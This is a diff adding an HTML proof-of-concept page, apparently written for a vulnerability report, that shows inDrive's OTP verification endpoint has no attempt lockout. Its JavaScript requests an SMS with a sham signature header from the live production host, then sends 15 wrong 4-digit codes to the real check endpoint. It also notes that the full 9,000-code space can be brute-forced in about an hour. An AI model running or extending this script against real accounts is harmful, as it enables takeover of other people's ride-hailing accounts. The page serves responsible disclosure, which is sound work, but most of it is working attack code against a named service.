@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>inDrive OTP Lockout Absence PoC</title>
+<style>
+body { font-family: system-ui, sans-serif; max-width: 850px; margin: 40px auto; padding: 0 20px; background: #f8f8f8; }
+h1 { font-size: 20px; color: #e74c3c; }
+.box { background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 16px; margin: 12px 0; }
+.warn { border-color: #e67e22; background: #fdf2e9; }
+pre { background: #1e1e1e; color: #d4d4d4; padding: 14px; border-radius: 6px; overflow-x: auto; font-size: 13px; white-space: pre-wrap; }
+.red { color: #e74c3c; font-weight: bold; }
+.green { color: #27ae60; font-weight: bold; }
+.gray { color: #888; }
+button { background: #e74c3c; color: #fff; border: none; padding: 12px 24px; font-size: 15px; border-radius: 6px; cursor: pointer; margin: 4px; }
+button:hover { background: #c0392b; }
+button:disabled { background: #999; }
+input { padding: 8px 12px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px; width: 200px; }
+table { width: 100%; border-collapse: collapse; margin-top: 12px; }
+th, td { padding: 8px 12px; text-align: left; border-bottom: 1px solid #eee; font-size: 14px; }
+th { background: #f5f5f5; font-weight: 600; }
+.pass { color: #27ae60; }
+.fail { color: #e74c3c; }
+#counter { font-size: 48px; font-weight: bold; text-align: center; padding: 20px; }
+.meter { height: 24px; background: #eee; border-radius: 12px; overflow: hidden; margin: 8px 0; }
+.meter-fill { height: 100%; background: linear-gradient(90deg, #e74c3c, #c0392b); border-radius: 12px; transition: width 0.3s; }
+</style>
+</head>
+<body>
+
+<h1>inDrive OTP Verify: Lockout Absence PoC</h1>
+
+<div class="box warn">
+<strong>What this proves:</strong> The OTP verify endpoint at <code>cas-cf.euce1.indriverapp.com</code> has
+<strong>no per-session attempt lockout</strong>. After N wrong guesses, a secure implementation would
+invalidate the session. inDrive does not. The 4-digit OTP (9,000 codes) is brute-forceable.<br><br>
+<strong>This PoC does NOT complete the brute force.</strong> It sends 15 wrong codes and shows that all 15 are accepted without lockout, counter, or session invalidation.
+</div>
+
+<h2>Step 1: Get an auth_id</h2>
+<div class="box">
+<p>Enter a phone number you control (the endpoint will send an SMS):</p>
+<input id="phoneCode" placeholder="Country code (e.g. 55)" value="55" style="width:80px">
+<input id="phone" placeholder="Phone (e.g. 11999887766)">
+<button id="btnSms" onclick="sendSms()">Send OTP SMS</button>
+<pre id="smsResult" style="display:none"></pre>
+</div>
+
+<div id="step2" style="display:none">
+<h2>Step 2: Test lockout (15 wrong codes)</h2>
+<div class="box">
+<p>auth_id: <code id="authIdDisplay"></code></p>
+<button id="btnTest" onclick="runTest()">Run 15 wrong OTP attempts</button>
+<div id="counter" style="display:none">
+  <span id="attemptCount">0</span> / 15 wrong codes accepted
+  <div class="meter"><div class="meter-fill" id="meterFill" style="width:0%"></div></div>
+</div>
+<table id="results" style="display:none">
+<thead><tr><th>#</th><th>Code sent</th><th>Server response</th><th>Locked out?</th></tr></thead>
+<tbody id="tbody"></tbody>
+</table>
+</div>
+</div>
+
+<div id="verdict" style="display:none">
+<h2>Verdict</h2>
+<div class="box" id="verdictBox"></div>
+</div>
+
+<script>
+var authId = '';
+var phoneVal = '';
+var phoneCodeVal = '';
+
+async function sendSms() {
+  var btn = document.getElementById('btnSms');
+  var res = document.getElementById('smsResult');
+  phoneCodeVal = document.getElementById('phoneCode').value.trim();
+  phoneVal = document.getElementById('phone').value.trim();
+  if (!phoneVal || !phoneCodeVal) { alert('Enter phone number'); return; }
+  btn.disabled = true;
+  res.style.display = 'block';
+  res.textContent = 'Sending SMS via cas-gw-cf.euce1.indriverapp.com/api/sms with x-signature: x ...';
+
+  try {
+    var r = await fetch('https://cas-gw-cf.euce1.indriverapp.com/api/sms', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json', 'x-signature': 'x'},
+      body: JSON.stringify({phone: phoneVal, phoneCode: phoneCodeVal, aud: 'login', locale: 'en'})
+    });
+    var d = await r.json();
+    res.textContent = 'Response (HTTP ' + r.status + '):\n' + JSON.stringify(d, null, 2);
+    if (d.auth_id) {
+      authId = d.auth_id;
+      document.getElementById('step2').style.display = 'block';
+      document.getElementById('authIdDisplay').textContent = authId;
+      res.textContent += '\n\n>> auth_id captured. SMS sent with x-signature: x (sham). Proceed to Step 2.';
+    }
+  } catch(e) {
+    res.textContent = 'Error: ' + e.message + '\n(CORS may block browser requests. Use the curl commands in the report instead.)';
+  }
+  btn.disabled = false;
+}
+
+async function runTest() {
+  var btn = document.getElementById('btnTest');
+  btn.disabled = true;
+  document.getElementById('counter').style.display = 'block';
+  document.getElementById('results').style.display = 'table';
+  var tbody = document.getElementById('tbody');
+  tbody.innerHTML = '';
+  var fullPhone = phoneCodeVal + phoneVal;
+  var codes = [1111,2222,3333,4444,5555,6666,7777,8888,9999,1234,5678,1357,2468,3690,1122];
+  var accepted = 0;
+
+  for (var i = 0; i < codes.length; i++) {
+    try {
+      var params = new URLSearchParams();
+      params.append('phone', fullPhone);
+      params.append('phoneCode', phoneCodeVal);
+      params.append('authcode', codes[i].toString());
+      params.append('auth_id', authId);
+      params.append('format', 'jwt');
+
+      var r = await fetch('https://cas-cf.euce1.indriverapp.com/api/v2/checkauthcode', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: params.toString()
+      });
+      var d = await r.json();
+      var slug = (d.error && d.error.slug) || 'JWT_RETURNED';
+      var locked = slug === 'error_code_not_found' ? 'NO' : (slug === 'JWT_RETURNED' ? 'JWT!' : slug);
+      if (slug === 'error_code_not_found') accepted++;
+
+      var tr = document.createElement('tr');
+      tr.innerHTML = '<td>' + (i+1) + '</td><td>' + codes[i] + '</td><td>' + slug + '</td><td class="' + (locked==='NO'?'fail':'') + '">' + locked + '</td>';
+      tbody.appendChild(tr);
+    } catch(e) {
+      var tr = document.createElement('tr');
+      tr.innerHTML = '<td>' + (i+1) + '</td><td>' + codes[i] + '</td><td>CORS/Network error</td><td>-</td>';
+      tbody.appendChild(tr);
+    }
+
+    document.getElementById('attemptCount').textContent = (i+1);
+    document.getElementById('meterFill').style.width = ((i+1)/15*100) + '%';
+    await new Promise(resolve => setTimeout(resolve, 400));
+  }
+
+  var v = document.getElementById('verdict');
+  var vb = document.getElementById('verdictBox');
+  v.style.display = 'block';
+
+  if (accepted >= 10) {
+    vb.innerHTML = '<p class="red" style="font-size:20px">NO LOCKOUT DETECTED</p>' +
+      '<p>' + accepted + ' out of 15 wrong OTP codes were accepted without lockout, counter increment, or session invalidation.</p>' +
+      '<p>The 4-digit OTP space (9,000 codes) is brute-forceable at compliant request rates (~60 minutes at 2.5 req/s).</p>' +
+      '<p>A secure implementation would invalidate the auth_id after 3-5 failed attempts. inDrive does not.</p>';
+  } else {
+    vb.innerHTML = '<p class="green">Lockout may have been added.</p><p>Only ' + accepted + ' attempts accepted.</p>';
+  }
+  btn.disabled = false;
+}
+</script>
+</body>
+</html>
